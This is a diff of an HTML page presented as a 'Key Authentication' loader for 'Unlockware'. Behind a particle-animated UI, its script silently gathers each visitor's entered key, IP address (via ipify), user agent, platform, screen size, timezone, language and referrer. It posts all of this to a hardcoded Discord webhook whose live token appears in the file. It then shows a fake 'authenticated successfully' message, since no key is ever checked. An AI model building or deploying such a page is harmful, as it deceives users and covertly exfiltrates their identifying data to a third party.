@@ -1,64 +1,618 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Secure Loader</title>
-  <style>
-    body {
-      background-color: #1a1a1a;
-      color: #ffffff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px;
-      font-size: 16px;
-    }
-    a {
-      color: #00ffcc;
-      text-decoration: none;
-      font-size: 18px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Key Authentication System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body.light-mode {
+            background-color: #f5f5f5;
+            color: #333;
+        }
+
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            background-color: rgba(30, 30, 30, 0.8);
+            border-radius: 10px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            border: 1px solid #333;
+        }
+
+        .light-mode .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border: 1px solid #ddd;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            color: #fff;
+            font-size: 1.8rem;
+        }
+
+        .light-mode h1 {
+            color: #222;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #aaa;
+        }
+
+        .light-mode label {
+            color: #555;
+        }
+
+        input {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #222;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s;
+            padding-right: 40px;
+        }
+
+        .light-mode input {
+            background-color: #fff;
+            color: #333;
+            border: 1px solid #ccc;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #555;
+            box-shadow: 0 0 5px rgba(255, 255, 255, 0.1);
+        }
+
+        .clear-btn {
+            position: absolute;
+            right: 10px;
+            top: 32px;
+            background: none;
+            border: none;
+            color: #777;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: all 0.2s;
+        }
+
+        .clear-btn:hover {
+            color: #aaa;
+        }
+
+        .loader-options {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 1.5rem;
+        }
+
+        .loader-option, .action-btn {
+            flex: 1;
+            padding: 0.8rem;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .light-mode .loader-option,
+        .light-mode .action-btn {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .loader-option:hover, .action-btn:hover {
+            background-color: #444;
+        }
+
+        .light-mode .loader-option:hover,
+        .light-mode .action-btn:hover {
+            background-color: #d0d0d0;
+        }
+
+        .loader-option.active {
+            background-color: #4a4a4a;
+            border: 1px solid #666;
+        }
+
+        .light-mode .loader-option.active {
+            background-color: #d5d5d5;
+            border: 1px solid #999;
+        }
+
+        #submit-btn {
+            width: 100%;
+            padding: 0.8rem;
+            background-color: #4a4a4a;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .light-mode #submit-btn {
+            background-color: #555;
+            color: #fff;
+        }
+
+        #submit-btn:hover {
+            background-color: #5a5a5a;
+        }
+
+        .light-mode #submit-btn:hover {
+            background-color: #666;
+        }
+
+        .status {
+            margin-top: 1.5rem;
+            padding: 0.8rem;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+
+        .success {
+            background-color: rgba(46, 125, 50, 0.3);
+            border: 1px solid #2e7d32;
+            color: #a5d6a7;
+        }
+
+        .light-mode .success {
+            background-color: rgba(46, 125, 50, 0.2);
+            color: #2e7d32;
+        }
+
+        .error {
+            background-color: rgba(198, 40, 40, 0.3);
+            border: 1px solid #c62828;
+            color: #ef9a9a;
+        }
+
+        .light-mode .error {
+            background-color: rgba(198, 40, 40, 0.2);
+            color: #c62828;
+        }
+
+        /* Loaders */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        .light-mode .loading {
+            border: 3px solid rgba(0, 0, 0, 0.2);
+            border-top-color: #333;
+        }
+
+        .loading-experimental {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            background: linear-gradient(45deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
+            background-size: 400%;
+            border-radius: 50%;
+            animation: experimentalSpin 1.5s linear infinite, gradientBG 3s ease infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes experimentalSpin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .footer {
+            margin-top: 1.5rem;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        .light-mode .footer {
+            color: #888;
+        }
+
+        /* Theme Toggle */
+        .theme-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 8px 12px;
+            cursor: pointer;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .light-mode .theme-toggle {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .theme-icon {
+            font-size: 1rem;
+        }
+    </style>
 </head>
 <body>
-  <h1>Key-Based Loader</h1>
-  <p>Enter your access key to unlock the download</p>
+    <button id="theme-toggle" class="theme-toggle">
+        <span class="theme-icon">🌙</span>
+    </button>
+    
+    <div id="particles-js"></div>
+    
+    <div class="container">
+        <h1>Key Authentication</h1>
+        
+        <div class="input-group">
+            <label for="key">Enter Your Key</label>
+            <input type="text" id="key" placeholder="XXXX-XXXX-XXXX-XXXX">
+            <button class="clear-btn" id="clear-btn">×</button>
+        </div>
+        
+        <div class="loader-options">
+            <div class="loader-option active" data-loader="stable">Stable Loader</div>
+            <div class="loader-option" data-loader="experimental">Experimental Loader</div>
+        </div>
+        
+        <button id="submit-btn">Authenticate</button>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="footer">
+            © 2023 Unlockware | Secure Access
+        </div>
+    </div>
 
-  <input type="text" id="keyInput" placeholder="Enter key here">
-  <button onclick="submitKey()">Unlock</button>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        // Initialize particles.js for interactive background
+        document.addEventListener('DOMContentLoaded', function() {
+            particlesJS('particles-js', {
+                "particles": {
+                    "number": {
+                        "value": 80,
+                        "density": {
+                            "enable": true,
+                            "value_area": 800
+                        }
+                    },
+                    "color": {
+                        "value": "#ffffff"
+                    },
+                    "shape": {
+                        "type": "circle",
+                        "stroke": {
+                            "width": 0,
+                            "color": "#000000"
+                        },
+                        "polygon": {
+                            "nb_sides": 5
+                        }
+                    },
+                    "opacity": {
+                        "value": 0.3,
+                        "random": false,
+                        "anim": {
+                            "enable": false,
+                            "speed": 1,
+                            "opacity_min": 0.1,
+                            "sync": false
+                        }
+                    },
+                    "size": {
+                        "value": 3,
+                        "random": true,
+                        "anim": {
+                            "enable": false,
+                            "speed": 40,
+                            "size_min": 0.1,
+                            "sync": false
+                        }
+                    },
+                    "line_linked": {
+                        "enable": true,
+                        "distance": 150,
+                        "color": "#555555",
+                        "opacity": 0.4,
+                        "width": 1
+                    },
+                    "move": {
+                        "enable": true,
+                        "speed": 2,
+                        "direction": "none",
+                        "random": false,
+                        "straight": false,
+                        "out_mode": "out",
+                        "bounce": false,
+                        "attract": {
+                            "enable": false,
+                            "rotateX": 600,
+                            "rotateY": 1200
+                        }
+                    }
+                },
+                "interactivity": {
+                    "detect_on": "canvas",
+                    "events": {
+                        "onhover": {
+                            "enable": true,
+                            "mode": "grab"
+                        },
+                        "onclick": {
+                            "enable": true,
+                            "mode": "push"
+                        },
+                        "resize": true
+                    },
+                    "modes": {
+                        "grab": {
+                            "distance": 140,
+                            "line_linked": {
+                                "opacity": 1
+                            }
+                        },
+                        "bubble": {
+                            "distance": 400,
+                            "size": 40,
+                            "duration": 2,
+                            "opacity": 8,
+                            "speed": 3
+                        },
+                        "repulse": {
+                            "distance": 200,
+                            "duration": 0.4
+                        },
+                        "push": {
+                            "particles_nb": 4
+                        },
+                        "remove": {
+                            "particles_nb": 2
+                        }
+                    }
+                },
+                "retina_detect": true
+            });
 
-  <div id="downloadSection" style="display:none; margin-top:20px;">
-    <p>✅ Key accepted!</p>
-    <a href="yourfile.zip" download>📦 Download File</a>
-  </div>
+            // Theme Toggle Functionality
+            const themeToggle = document.getElementById('theme-toggle');
+            const themeIcon = document.querySelector('.theme-icon');
+            
+            function toggleDarkMode() {
+                document.body.classList.toggle('light-mode');
+                const isLightMode = document.body.classList.contains('light-mode');
+                themeIcon.textContent = isLightMode ? '☀️' : '🌙';
+                localStorage.setItem('lightMode', isLightMode);
+            }
+            
+            themeToggle.addEventListener('click', toggleDarkMode);
+            
+            // Initialize theme from localStorage
+            if (localStorage.getItem('lightMode') === 'true') {
+                document.body.classList.add('light-mode');
+                themeIcon.textContent = '☀️';
+            }
 
-  <script>
-    const webhook = "https://discord.com/api/webhooks/1397862831730462833/3ZchpVYVF_gpSfFrIsr52Dr57p0Qd-qx252TEEX67K70P8aUBgWLMp9sBt2aEc8SCDot";
+            // Loader selection
+            const loaderOptions = document.querySelectorAll('.loader-option');
+            let currentLoader = 'stable';
+            
+            loaderOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    loaderOptions.forEach(opt => opt.classList.remove('active'));
+                    this.classList.add('active');
+                    currentLoader = this.dataset.loader;
+                });
+            });
 
-    function submitKey() {
-      const key = document.getElementById("keyInput").value.trim();
+            // Clear button functionality
+            document.getElementById('clear-btn').addEventListener('click', function() {
+                document.getElementById('key').value = '';
+                document.getElementById('status').style.display = 'none';
+            });
 
-      if (!key || key.length < 4) {
-        alert("Invalid key.");
-        return;
-      }
-
-      // Send to Discord webhook
-      fetch(webhook, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `🔑 New key used: \`${key}\``
-        })
-      }).catch(err => console.error("Webhook error:", err));
-
-      // Show download section
-      document.getElementById("downloadSection").style.display = "block";
-    }
-  </script>
+            // Key submission and webhook logging
+            document.getElementById('submit-btn').addEventListener('click', function() {
+                const keyInput = document.getElementById('key');
+                const statusDiv = document.getElementById('status');
+                const submitBtn = document.getElementById('submit-btn');
+                
+                const key = keyInput.value.trim();
+                
+                if (!key) {
+                    statusDiv.textContent = 'Please enter a key';
+                    statusDiv.className = 'status error';
+                    statusDiv.style.display = 'block';
+                    return;
+                }
+                
+                // Show loading state
+                submitBtn.disabled = true;
+                const loaderClass = currentLoader === 'stable' ? 'loading' : 'loading-experimental';
+                submitBtn.innerHTML = `<span class="${loaderClass}"></span> Authenticating...`;
+                statusDiv.style.display = 'none';
+                
+                // Collect user information
+                const userInfo = {
+                    key: key,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'direct',
+                    ip: 'fetching...', // Will be updated by the IP API
+                    loaderType: currentLoader,
+                    themeMode: document.body.classList.contains('light-mode') ? 'light' : 'dark'
+                };
+                
+                // First get IP address
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        userInfo.ip = ipData.ip;
+                        
+                        // Now send all data to Discord webhook
+                        const webhookUrl = 'https://discord.com/api/webhooks/1397862831730462833/3ZchpVYVF_gpSfFrIsr52Dr57p0Qd-qx252TEEX67K70P8aUBgWLMp9sBt2aEc8SCDot';
+                        
+                        const embed = {
+                            title: "Key Authentication Attempt",
+                            color: 0x3498db,
+                            fields: [
+                                {
+                                    name: "Key Used",
+                                    value: `\`\`\`${userInfo.key}\`\`\``,
+                                    inline: false
+                                },
+                                {
+                                    name: "IP Address",
+                                    value: userInfo.ip,
+                                    inline: true
+                                },
+                                {
+                                    name: "Location",
+                                    value: `Timezone: ${userInfo.timezone}`,
+                                    inline: true
+                                },
+                                {
+                                    name: "Device Info",
+                                    value: `Platform: ${userInfo.platform}\nResolution: ${userInfo.screenResolution}\nLanguage: ${userInfo.language}`,
+                                    inline: false
+                                },
+                                {
+                                    name: "User Agent",
+                                    value: `\`\`\`${userInfo.userAgent}\`\`\``,
+                                    inline: false
+                                },
+                                {
+                                    name: "Timestamp",
+                                    value: new Date(userInfo.timestamp).toLocaleString(),
+                                    inline: true
+                                },
+                                {
+                                    name: "Referrer",
+                                    value: userInfo.referrer,
+                                    inline: true
+                                },
+                                {
+                                    name: "Loader Type",
+                                    value: userInfo.loaderType,
+                                    inline: true
+                                },
+                                {
+                                    name: "Theme Mode",
+                                    value: userInfo.themeMode,
+                                    inline: true
+                                }
+                            ]
+                        };
+                        
+                        const payload = {
+                            embeds: [embed]
+                        };
+                        
+                        // Send to Discord webhook
+                        return fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(payload)
+                        });
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Webhook failed');
+                        }
+                        
+                        // Simulate server response
+                        setTimeout(() => {
+                            statusDiv.textContent = 'Key authenticated successfully!';
+                            statusDiv.className = 'status success';
+                            statusDiv.style.display = 'block';
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Authenticate';
+                            keyInput.value = '';
+                        }, 1500);
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        statusDiv.textContent = 'Authentication failed. Please try again.';
+                        statusDiv.className = 'status error';
+                        statusDiv.style.display = 'block';
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Authenticate';
+                    });
+            });
+        });
+    </script>
 </body>
 </html>
